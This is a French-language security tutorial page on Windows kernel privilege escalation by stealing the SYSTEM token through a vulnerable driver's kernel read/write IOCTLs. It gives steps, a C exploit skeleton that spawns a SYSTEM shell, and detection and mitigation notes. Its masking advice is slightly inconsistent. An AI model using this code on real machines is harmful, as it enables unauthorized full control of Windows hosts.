# Windows kernel EoP : Token stealing avec arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## Vue d’ensemble

Si un driver vulnérable expose un IOCTL qui fournit à un attacker des primitives arbitrary kernel read and/or write, l’élévation vers NT AUTHORITY\SYSTEM peut souvent être obtenue en volant un token SYSTEM. La technique copie le pointeur Token de l’EPROCESS d’un processus SYSTEM vers l’EPROCESS du processus actuel.<sup>[[2]](#references)</sup>

Pourquoi cela fonctionne :
- Chaque processus possède une structure EPROCESS qui contient, entre autres champs, un Token (en réalité un EX_FAST_REF vers un objet token).
- Le processus SYSTEM (PID 4) possède un token avec tous les privileges activés.
- Le remplacement de EPROCESS.Token du processus actuel par le pointeur du token SYSTEM fait immédiatement s’exécuter le processus en tant que SYSTEM.<sup>[[1]](#references)</sup>

> Les offsets dans EPROCESS varient selon les versions de Windows. Déterminez-les dynamiquement (symbols) ou utilisez des constantes spécifiques à la version. N’oubliez pas non plus que EPROCESS.Token est un EX_FAST_REF (les 3 bits de poids faible sont des flags de compteur de références).

## Étapes générales

1) Localiser la base de ntoskrnl.exe et résoudre l’adresse de PsInitialSystemProcess.
- Depuis le user mode, utiliser NtQuerySystemInformation(SystemModuleInformation) ou EnumDeviceDrivers pour obtenir les bases des drivers chargés.
- Ajouter l’offset de PsInitialSystemProcess (à partir des symbols/reversing) à la base du kernel pour obtenir son adresse.
2) Lire le pointeur à PsInitialSystemProcess → il s’agit d’un pointeur kernel vers l’EPROCESS de SYSTEM.
3) Depuis l’EPROCESS de SYSTEM, lire les offsets de UniqueProcessId et ActiveProcessLinks afin de parcourir la liste doublement chaînée des structures EPROCESS (ActiveProcessLinks.Flink/Blink) jusqu’à trouver l’EPROCESS dont le UniqueProcessId est égal à GetCurrentProcessId(). Conserver les deux :
- EPROCESS_SYSTEM (pour SYSTEM)
- EPROCESS_SELF (pour le processus actuel)
4) Lire la valeur du token SYSTEM : Token_SYS = *(EPROCESS_SYSTEM + TokenOffset).
- Masquer les 3 bits de poids faible : Token_SYS_masked = Token_SYS & ~0xF (généralement ~0xF ou ~0x7 selon le build ; sur x64, les 3 bits de poids faible sont utilisés — masque 0xFFFFFFFFFFFFFFF8).
5) Option A (courante) : Préserver les 3 bits de poids faible du token actuel et les combiner avec le pointeur de SYSTEM afin de conserver le compteur de références embarqué cohérent.
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) Réécrire Token_NEW dans (EPROCESS_SELF + TokenOffset) en utilisant votre primitive kernel write.
7) Votre processus actuel est maintenant SYSTEM. Vous pouvez éventuellement lancer un nouveau cmd.exe ou powershell.exe pour confirmer.<sup>[[1]](#references)</sup>

## Pseudocode

Vous trouverez ci-dessous un squelette qui utilise uniquement deux IOCTL provenant d’un driver vulnérable : un pour la lecture kernel de 8 octets et un pour l’écriture kernel de 8 octets. Remplacez-les par l’interface de votre driver.<sup>[[1]](#references)</sup>
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
Notes :
- Offsets : utilisez `dt nt!_EPROCESS` de WinDbg avec les PDB de la cible, ou un chargeur de symboles à l’exécution, afin d’obtenir les offsets corrects. Ne les hardcodez pas aveuglément.
- Masque : sur x64, le token est un EX_FAST_REF ; les 3 bits de poids faible correspondent aux bits du compteur de références. Conserver les bits de poids faible d’origine de votre token évite des incohérences immédiates du compteur de références.
- Stabilité : privilégiez l’élévation du processus actuel ; si vous élevez un helper à courte durée de vie, vous risquez de perdre SYSTEM lorsqu’il se termine.<sup>[[1]](#references)</sup>

## Détection et mitigation
- Le chargement de drivers tiers non signés ou non fiables qui exposent des IOCTL puissants est la cause première.
- Kernel Driver Blocklist (HVCI/CI), DeviceGuard et les règles Attack Surface Reduction peuvent empêcher le chargement de drivers vulnérables.
- Un EDR peut surveiller les séquences d’IOCTL suspectes qui implémentent une lecture/écriture arbitraire, ainsi que les échanges de tokens.

## Références

- [1] [HTB Reaper : Format-string leak + stack BOF → VirtualAlloc ROP (RCE) et vol de token du kernel](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [2] [FuzzySecurity – Windows Kernel ExploitDev (exemples de token stealing)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
